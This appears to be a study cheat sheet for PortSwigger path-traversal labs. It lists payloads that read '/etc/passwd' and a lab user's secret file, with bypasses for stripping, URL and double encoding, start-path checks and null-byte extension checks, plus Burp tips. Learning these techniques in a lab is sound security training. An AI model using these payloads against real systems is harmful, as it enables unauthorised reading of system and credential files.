# Path Traversal - Stage 3

## 🎯 Target Location

**Primary Target:** `/image?filename=` parameter

## 🔥 Quick Win: Use Burp Scanner

**RECOMMENDED:** Burp Scanner will automatically find and exploit path traversal.

**If scanner works but `/home/carlos/secret` is blocked:**
- WAF might be blocking the word "secret"
- Solution: URL-encode the ENTIRE payload

## 📋 Basic Payloads

### Simple Traversal
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

### Target File
```
../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret
```

## 🛡️ Bypass Techniques

### Absolute Path Bypass
**Scenario:** Traversal sequences blocked

```
/etc/passwd
/home/carlos/secret
```

---

### Non-Recursive Stripping Bypass
**Scenario:** Application strips `../` once

```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
```

**How it works:**
- Input: `....//`
- After stripping `../`: `../`

---

### URL Encoding Bypass
**Scenario:** Basic traversal blocked

```
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret
```

---

### Double URL Encoding Bypass
**Scenario:** Single encoding blocked

```
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

**Encoding:**
- `/` → `%2f` → `%252f`

---

### Superfluous URL-Decode Bypass
**Scenario:** Application decodes input multiple times

```
..%252f..%252f..%252fetc%252fpasswd
```

---

### Full Path URL Encoding
**⭐ EXAM TIP:** If you can read `/etc/passwd` but not `/home/carlos/secret`

**Encode ENTIRE payload including `/home/carlos/secret`:**
```
%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

This is double URL-encoded: `../../../../../../home/carlos/secret`

---

### Validation of Start Path Bypass
**Scenario:** Must start with expected path

```
/var/www/images/../../../etc/passwd
/var/www/images/../../../home/carlos/secret
```

---

### Null Byte Bypass
**Scenario:** Extension validation (e.g., must end with `.png`)

```
../../../etc/passwd%00.png
../../../home/carlos/secret%00.png
```

**Note:** Works on older systems (PHP < 5.3.4)

---

### Backslash Bypass (Windows)
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\home\carlos\secret
```

## 🎓 Exam Tips

1. **Use Burp Scanner first** - Automatically finds path traversal
2. **Enable image inspection** - Proxy → Options → Intercept Client Requests → Images
3. **Try full URL encoding** - If basic payloads blocked
4. **Test both `/` and `\`** - Windows vs Linux
5. **Check error messages** - Reveal file paths
6. **Try absolute paths** - `/etc/passwd`, `/home/carlos/secret`

## 🔍 Burp Proxy Settings

**Enable image inspection to easily detect path traversal:**

1. Proxy → Options → Intercept Client Requests
2. Check "And URL Is in target scope"
3. Add rule for images: `.*\.(jpg|jpeg|png|gif)$`

## 📚 Lab Examples

### Lab 1: Absolute Path Bypass
```
/image?filename=/etc/passwd
/image?filename=/home/carlos/secret
```

---

### Lab 2: Non-Recursive Stripping
```
/image?filename=....//....//....//etc/passwd
/image?filename=....//....//....//home/carlos/secret
```

---

### Lab 3: Superfluous URL-Decode
```
/image?filename=..%252f..%252f..%252fetc%252fpasswd
```

---

### Lab 4: Start Path Validation
```
/image?filename=/var/www/images/../../../etc/passwd
```

---

### Lab 5: Null Byte Bypass
```
/image?filename=../../../etc/passwd%00.png
```

## 🔗 Quick Reference

| Bypass Type | Payload Example |
|-------------|-----------------|
| Basic | `../../../etc/passwd` |
| Absolute path | `/etc/passwd` |
| Non-recursive strip | `....//....//etc/passwd` |
| URL encoding | `..%2f..%2f..%2fetc%2fpasswd` |
| Double encoding | `..%252f..%252fetc%252fpasswd` |
| Full encoding | `%25%32%66...` (entire path) |
| Start path validation | `/var/www/images/../../../etc/passwd` |
| Null byte | `../../../etc/passwd%00.png` |

## 📚 References

- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal/cheat-sheet)
